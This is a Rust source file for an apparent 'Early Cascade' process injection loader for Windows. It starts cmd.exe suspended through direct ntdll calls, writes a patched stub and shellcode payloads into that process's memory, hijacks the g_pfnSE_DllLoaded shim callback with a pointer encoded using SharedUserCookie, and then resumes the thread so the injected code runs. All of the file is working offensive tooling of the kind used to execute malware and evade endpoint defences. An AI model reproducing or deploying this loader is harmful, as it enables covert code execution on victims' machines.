#![allow(non_snake_case)]
#![allow(improper_ctypes)]
#![allow(improper_ctypes_definitions)]
#[allow(unused_variables)]

use noldr::{get_function_address, RTL_USER_PROCESS_PARAMETERS, UNICODE_STRING};

use ntapi::ntpsapi::{
    PS_ATTRIBUTE_u, PsCreateInitialState, PS_ATTRIBUTE, PS_ATTRIBUTE_IMAGE_NAME, PS_CREATE_INFO,
};
use ntapi::ntrtl::RTL_USER_PROC_PARAMS_NORMALIZED;

use std::mem::zeroed;
use std::ptr::{self, null_mut};
use winapi::ctypes::c_void;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::ntdef::HANDLE as winapi_HANDLE;
use winapi::shared::ntdef::NT_SUCCESS;
use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS};
use windows::Win32::Foundation::HANDLE;

use md5::{Digest, Md5};

use winapi::shared::{
    basetsd::{PSIZE_T, ULONG_PTR},
    minwindef::{FARPROC, PULONG, ULONG},
    ntdef::{
        NTSTATUS, PVOID,
    },
};

#[repr(C)]
struct PsAttributeList {
    total_length: SIZE_T,
    attributes: [PS_ATTRIBUTE; 2],
}

//create suspended process with NtCreateUserProcess
pub extern "C" fn CreateSuspendedProcess(ntdll: *const std::ffi::c_void) -> (HANDLE, HANDLE) {
    unsafe {
        //locate NtCreateUserProcess
        let function_address = get_function_address(ntdll, "NtCreateUserProcess").unwrap();
        let NtCreateUserProcess = std::mem::transmute::<
            _,
            extern "system" fn(
                ProcessHandle: *mut HANDLE,
                ThreadHandle: *mut HANDLE,
                ProcessDesiredAccess: u32,
                ThreadDesiredAccess: u32,
                ProcessObjectAttributes: *mut c_void,
                ThreadObjectAttributes: *mut c_void,
                ProcessFlags: u32,
                ThreadFlags: u32,
                ProcessParameters: *mut c_void,
                CreateInfo: *mut PS_CREATE_INFO,
                AttributeList: *mut PsAttributeList,
            ) -> i32,
        >(function_address);
        println!("NtCreateUserProcess: {:?}", NtCreateUserProcess);

        //locate RtlInitUnicodeString
        let function_address = get_function_address(ntdll, "RtlInitUnicodeString").unwrap();
        let RtlInitUnicodeString = std::mem::transmute::<
            _,
            extern "system" fn(*mut UNICODE_STRING, *const u16),
        >(function_address);
        println!("RtlInitUnicodeString: {:?}", RtlInitUnicodeString);

        //locate RtlCreateProcessParametersEx
        let function_address = get_function_address(ntdll, "RtlCreateProcessParametersEx").unwrap();
        let RtlCreateProcessParametersEx = std::mem::transmute::<
            _,
            extern "system" fn(
                *mut *mut RTL_USER_PROCESS_PARAMETERS, // pProcessParameters
                *mut UNICODE_STRING,                   // ImagePathName
                *mut UNICODE_STRING,                   // DllPath
                *mut UNICODE_STRING,                   // CurrentDirectory
                *mut UNICODE_STRING,                   // CommandLine
                *mut c_void,                           // Environment
                *mut UNICODE_STRING,                   // WindowTitle
                *mut UNICODE_STRING,                   // DesktopInfo
                *mut UNICODE_STRING,                   // ShellInfo
                *mut UNICODE_STRING,                   // RuntimeData
                u32,                                   // Flags
            ) -> i32,
        >(function_address);
        println!(
            "RtlCreateProcessParametersEx: {:?}",
            RtlCreateProcessParametersEx
        );

        let nt_image_path = r"\??\C:\Windows\System32\cmd.exe";
        let mut nt_image_path: Vec<u16> = nt_image_path.encode_utf16().collect();
        nt_image_path.push(0);

        let mut nt_image_path_unicode: UNICODE_STRING = std::mem::zeroed();
        RtlInitUnicodeString(&mut nt_image_path_unicode, nt_image_path.as_ptr());

        let mut process_params: *mut RTL_USER_PROCESS_PARAMETERS = null_mut();
        let status = RtlCreateProcessParametersEx(
            &mut process_params,
            &mut nt_image_path_unicode,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            RTL_USER_PROC_PARAMS_NORMALIZED,
        );

        if !NT_SUCCESS(status) {
            println!("err 1: {:x}", status);
            return (HANDLE(0), HANDLE(0));
        }

        let mut create_info: PS_CREATE_INFO = zeroed();
        create_info.Size = std::mem::size_of::<PS_CREATE_INFO>();
        create_info.State = PsCreateInitialState;

        let ps_attribute = PS_ATTRIBUTE {
            Attribute: PS_ATTRIBUTE_IMAGE_NAME,
            Size: nt_image_path_unicode.Length as usize,
            u: PS_ATTRIBUTE_u {
                ValuePtr: nt_image_path_unicode.Buffer as *mut _,
            },
            ReturnLength: ptr::null_mut(),
        };

        let empty_attr: PS_ATTRIBUTE = zeroed();
        let ps_attribute_list = PsAttributeList {
            total_length: std::mem::size_of::<PsAttributeList>() - size_of::<PS_ATTRIBUTE>(), // 40 (72 - 32)
            attributes: [ps_attribute, empty_attr], // Only include the first attribute here
        };

        let ps_attribute_list = std::mem::transmute(&ps_attribute_list);
        let create_info = std::mem::transmute(&create_info);

        let mut process_handle: HANDLE = HANDLE(0);
        let mut thread_handle: HANDLE = HANDLE(0);
        let process_handle_ptr = &mut process_handle as *mut HANDLE;
        let thread_handle_ptr = &mut thread_handle as *mut HANDLE;

        let status = NtCreateUserProcess(
            process_handle_ptr,
            thread_handle_ptr,
            PROCESS_ALL_ACCESS,
            THREAD_ALL_ACCESS,
            null_mut(),
            null_mut(),
            0,
            1,
            process_params as *mut c_void,
            create_info,
            ps_attribute_list,
        );

        if !NT_SUCCESS(status) {
            println!("err 2: {:x}", status);
            return (HANDLE(0), HANDLE(0));
        }

        (process_handle, thread_handle)
    }
}

//here we will have a function for calculating the md5 hash of the ntdll on disk
//this will be useful for testing with different versions of ntdll
pub extern "C" fn CalculateNtdllMd5() -> *mut i8 {
    let ntdll_path = r"C:\Windows\System32\ntdll.dll";
    let mut ntdll_hash = Md5::new();
    let ntdll_bytes = std::fs::read(ntdll_path).unwrap();
    ntdll_hash.update(&ntdll_bytes);
    let hash = format!("{:x}", ntdll_hash.finalize());

    // Convert to C string and leak (caller must free)
    let c_str = std::ffi::CString::new(hash).unwrap();
    c_str.into_raw()
}

pub extern "C" fn MapShellcodes(
    process: winapi_HANDLE,
    cascade_stub: &[u8],
    paystub: &[u8],
    final_payload: &[u8],
    ntdll: *const std::ffi::c_void,
    g_ShimsEnabled_addr: usize,
) -> PVOID {
    unsafe {
        // Calculate total size needed
        let size = (cascade_stub.len() + paystub.len() + final_payload.len()) as SIZE_T;
        
        // Get NtAllocateVirtualMemory function
        let NtAllocateVirtualMemory = std::mem::transmute::<_, extern "system" fn(
            ProcessHandle: winapi_HANDLE,
            BaseAddress: *mut PVOID,
            ZeroBits: ULONG_PTR,
            RegionSize: PSIZE_T,
            AllocationType: ULONG,
            Protect: ULONG,
        ) -> NTSTATUS>(get_function_address(ntdll, "NtAllocateVirtualMemory").unwrap());

        // Allocate memory in target process
        let mut remote_base: PVOID = null_mut();
        let mut alloc_size = size;
        let result = NtAllocateVirtualMemory(
            process,
            &mut remote_base,
            0,
            &mut alloc_size,
            MEM_COMMIT,
            PAGE_READWRITE
        );

        if !NT_SUCCESS(result) {
            println!("NtAllocateVirtualMemory Failed: {:x}", result);
            return null_mut();
        }

        // Create patched version of cascade_stub
        let mut patched_stub = cascade_stub.to_vec();
        
        // Calculate addresses for patching
        let _paystub_addr = (remote_base as usize + cascade_stub.len()) as u64;
        let final_payload_addr = (remote_base as usize + cascade_stub.len() + paystub.len()) as u64;
        let nt_queue_apc = get_function_address(ntdll, "NtQueueApcThread").unwrap() as u64;
        
        // Patch the values
        if let Some(offset) = find_pattern(&patched_stub, 0x6666666666666666) {
            patched_stub[offset..offset + 8].copy_from_slice(&nt_queue_apc.to_le_bytes());
        }
        if let Some(offset) = find_pattern(&patched_stub, 0x7777777777777777) {
            patched_stub[offset..offset + 8].copy_from_slice(&(paystub.len() as u64).to_le_bytes());
        }
        if let Some(offset) = find_pattern(&patched_stub, 0x8888888888888888) {
            patched_stub[offset..offset + 8].copy_from_slice(&final_payload_addr.to_le_bytes());
        }
        if let Some(offset) = find_pattern(&patched_stub, 0x9999999999999999) {
            patched_stub[offset..offset + 8].copy_from_slice(&(g_ShimsEnabled_addr as u64).to_le_bytes());
        }

        // Get NtWriteVirtualMemory function
        let NtWriteVirtualMemory: unsafe extern "system" fn(
            ProcessHandle: winapi_HANDLE,
            BaseAddress: PVOID,
            Buffer: PVOID,
            BufferSize: SIZE_T,
            NumberOfBytesWritten: PSIZE_T,
        ) -> NTSTATUS = std::mem::transmute(get_function_address(ntdll, "NtWriteVirtualMemory").unwrap());

        // Write all components directly to target process
        let mut bytes_written: SIZE_T = 0;
        
        // Write cascade stub
        let _result = NtWriteVirtualMemory(
            process,
            remote_base,
            patched_stub.as_ptr() as PVOID,
            patched_stub.len() as SIZE_T,
            &mut bytes_written,
        );

        // Write paystub
        let _result = NtWriteVirtualMemory(
            process,
            (remote_base as usize + cascade_stub.len()) as PVOID,
            paystub.as_ptr() as PVOID,
            paystub.len() as SIZE_T,
            &mut bytes_written,
        );

        // Write final payload
        let _result = NtWriteVirtualMemory(
            process,
            (remote_base as usize + cascade_stub.len() + paystub.len()) as PVOID,
            final_payload.as_ptr() as PVOID,
            final_payload.len() as SIZE_T,
            &mut bytes_written,
        );

        //change the protection of the memory to execute but not write
        let NtProtectVirtualMemory = std::mem::transmute::<_, extern "system" fn(
            ProcessHandle: winapi_HANDLE,
            BaseAddress: *mut PVOID,
            RegionSize: PSIZE_T,
            NewProtect: ULONG,
            OldProtect: PULONG,
        ) -> NTSTATUS>(get_function_address(ntdll, "NtProtectVirtualMemory").unwrap());

        let mut base_addr = remote_base;
        let mut region_size = size;
        let mut old_protect: ULONG = 0;
        
        let _result = NtProtectVirtualMemory(
            process,
            &mut base_addr,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_protect
        );

        println!("TEST_CODE (final_payload) will be at: 0x{:x}", 
            remote_base as usize + cascade_stub.len() + paystub.len());

        remote_base
    }
}

fn find_pattern(data: &[u8], pattern: u64) -> Option<usize> {
    let pattern_bytes = pattern.to_le_bytes();
    data.windows(8)
        .position(|window| window == pattern_bytes)
}

//now we need to overwrite the address of g_pfnSE_DllLoaded with the address of the shellcode
pub extern "C" fn OverwriteSE_DllLoaded(
    new_handle: winapi_HANDLE,
    shellcode_addr: PVOID,
    g_pfnSE_DllLoaded_addr: usize,
    g_ShimsEnabled_addr: usize,
    ntdll: *const std::ffi::c_void,
) -> NTSTATUS {
    unsafe {
        println!("Target process handle: {:?}", new_handle);
        println!("Shellcode address to write: {:p}", shellcode_addr);
        println!(
            "g_pfnSE_DllLoaded address to update: 0x{:x}",
            g_pfnSE_DllLoaded_addr
        );
        println!(
            "g_ShimsEnabled address to update: 0x{:x}",
            g_ShimsEnabled_addr
        );

        let function_address = get_function_address(ntdll, "NtWriteVirtualMemory").unwrap();
        let NtWriteVirtualMemory: unsafe extern "system" fn(
            ProcessHandle: winapi_HANDLE,
            BaseAddress: PVOID,
            Buffer: PVOID,
            BufferSize: SIZE_T,
            NumberOfBytesWritten: PSIZE_T,
        ) -> NTSTATUS = std::mem::transmute(function_address);

        // Get SharedUserCookie from KUSER_SHARED_DATA
        let shared_user_cookie = *(0x7FFE0330 as *const u32);
        
        // Encode pointer:
        // 1. XOR with SharedUserCookie
        // 2. Rotate right by (SharedUserCookie & 0x3F)
        let target_addr = shellcode_addr as usize;
        let xored = target_addr ^ (shared_user_cookie as usize);
        let final_value = xored.rotate_right(shared_user_cookie & 0x3F);

        let mut bytes_written: SIZE_T = 0;
        
        let result = NtWriteVirtualMemory(
            new_handle,
            g_pfnSE_DllLoaded_addr as PVOID,
            &final_value as *const _ as PVOID,
            std::mem::size_of::<usize>() as SIZE_T,
            &mut bytes_written,
        );

        println!("Original shellcode addr: 0x{:x}", shellcode_addr as usize);
        println!("Encoded shellcode addr: 0x{:x}", final_value);
        println!("Write result for g_pfnSE_DllLoaded: 0x{:x}", result);
        println!("Bytes written: {}", bytes_written);

        // Write 1 to g_ShimsEnabled
        let shims_value: u32 = 1;
        let shims_result = NtWriteVirtualMemory(
            new_handle,
            g_ShimsEnabled_addr as PVOID,
            &shims_value as *const _ as PVOID,
            std::mem::size_of::<u32>() as SIZE_T,
            &mut bytes_written,
        );

        println!("Write result for g_ShimsEnabled: 0x{:x}", shims_result);
        println!("Bytes written: {}", bytes_written);

        // Return the last result (or you could combine them if you prefer)
        shims_result
    }
}

//now we need to resume the thread in the target process
pub extern "C" fn ResumeThread(
    thread_handle: winapi_HANDLE,
    ntdll: *const std::ffi::c_void,
) -> NTSTATUS {
    let function_address = get_function_address(ntdll, "NtAlertResumeThread").unwrap();

    let NtAlertResumeThread: unsafe fn(
        ThreadHandle: winapi_HANDLE,
        PreviousSuspendCount: PULONG,
    ) -> NTSTATUS = unsafe { std::mem::transmute(function_address as FARPROC) };

    let mut previous_suspend_count: ULONG = 0;

    let resumeresult = unsafe { NtAlertResumeThread(thread_handle, &mut previous_suspend_count) };

    resumeresult
}
